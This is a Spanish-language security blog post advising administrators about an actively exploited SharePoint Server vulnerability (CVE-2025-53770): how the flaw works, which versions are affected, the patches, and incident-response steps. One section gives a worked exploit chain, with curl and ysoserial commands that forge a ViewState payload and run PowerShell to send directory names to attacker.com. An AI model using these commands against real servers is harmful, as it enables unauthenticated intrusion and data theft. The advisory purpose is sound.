---
layout: post
title: "Vulnerabilidad Crítica en Microsoft SharePoint"
subtitle: "De criticidad 9.8/10 y bajo exploiting masivo"
date: 2025-07-21
share-img: /assets/img/microsoft-share.png
author: Alexia
tags: [seguridad, vulnerabilidad, sharepoint, sysadmin, microsoft]
---

> **Advertencia:** Vulnerabilidad crítica en Microsoft SharePoint permite acceso remoto no autenticado y robo de credenciales. Parches ya disponibles para SharePoint 2019 y Subscription Edition. **Cualquier servidor on-premises expuesto debe considerarse potencialmente comprometido.**

## Resumen

Una vulnerabilidad de **alta gravedad** (CVE-2025-53770, puntaje 9.8/10) en **Microsoft SharePoint Server** está siendo explotada globalmente. Permite a atacantes acceder remotamente sin autenticación, extraer credenciales y datos sensibles, y ejecutar comandos arbitrarios. Investigadores y autoridades recomiendan a cualquier organización con SharePoint on-premises que **asuma que su red podría estar comprometida** si no ha aplicado los parches.

- **Afecta:** SharePoint Server (on-premises) 2019 y Subscription Edition.  
- **No afecta:** SharePoint Online ni Microsoft 365.

## Qué está pasando

Desde el 18 de julio, investigadores han detectado **ataques masivos** usando esta vulnerabilidad para instalar un backdoor (ToolShell) que extrae credenciales (tokens de autenticación) y permite a los atacantes ejecutar comandos en el servidor, escalar privilegios y moverse lateralmente en la red.

### Explotación técnica

El ataque abusa de cómo SharePoint maneja la serialización y el ViewState de ASP.NET. Los atacantes pueden extraer la clave secreta `ValidationKey` del servidor (desde memoria o configuración) y, usando herramientas como `ysoserial`, generar payloads __VIEWSTATE válidos que otorgan **ejecución remota de código (RCE)**, sin necesidad de credenciales.

#### Ejemplo de explotación

```bash
# Obtener el valor __VIEWSTATEGENERATOR desde una página pública de SharePoint
curl -s https://target.com/_layouts/15/start.aspx | grep -oP '__VIEWSTATEGENERATOR" value="\K[^"]+'

# Generar un payload malicioso con ysoserial para listar un directorio y exfiltrar nombres a un servidor externo
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"dir 'C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS' | % { Invoke-WebRequest -Uri ('http://attacker.com/?f=' + [uri]::EscapeDataString($_.Name)) }\"" \
--generator="" \
--validationkey="" \
--validationalg="" \
--islegacy \
--minify

# Usar el token generado para ejecutar comandos en el servidor
curl http://target/_layouts/15/success.aspx?__VIEWSTATE=<payload>
```

Este ataque permite insertar cualquier comando malicioso que el servidor aceptará como si fuera un usuario legítimo, con persistencia y sin requerir autenticación.

Versiones afectadas y parches
SharePoint 2019 y Subscription Edition: Parche ya disponible, aplicar inmediatamente.

SharePoint 2016: Sin parche al momento del aviso. Microsoft recomienda instalar la Antimalware Scan Interface.

Los parches recientes (CVE-2025-53770 y CVE-2025-53771) también refuerzan mitigaciones para vulnerabilidades previas (CVE-2025-49704 y CVE-2025-49706).

Qué hacer si usás SharePoint on-premises
Aplicar los parches oficiales publicados por Microsoft lo antes posible.

- Rotar las claves de máquina de ASP.NET (ValidationKey y DecryptionKey) inmediatamente después de actualizar.

- Reiniciar IIS tras el cambio de claves.

- Auditar actividad reciente en los logs, buscando patrones anómalos y presencia del backdoor ToolShell.

- Consultar los indicadores de compromiso y recomendaciones técnicas publicadas por Eye Security y CISA.

Si tu instancia está expuesta a internet y no tenés certeza de la integridad, asumí compromiso total y considerá plan de respuesta ante incidentes (cambio de credenciales, aislamiento, análisis forense, etc).

Recursos y enlaces útiles: 
[Microsoft Security Update Guide (CVE-2025-53770)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770)

[Eye Security – Indicadores técnicos y análisis de ToolShell](https://www.eye.security/blog/eye-security-uncovers-actively-exploited-zero-day-in-microsoft-sharepoint-cve-2025-53770)



Recordá: Parchar es solo el primer paso. Si tu servidor fue vulnerable, los atacantes pueden haber robado credenciales y claves que permiten atacar otros sistemas más adelante.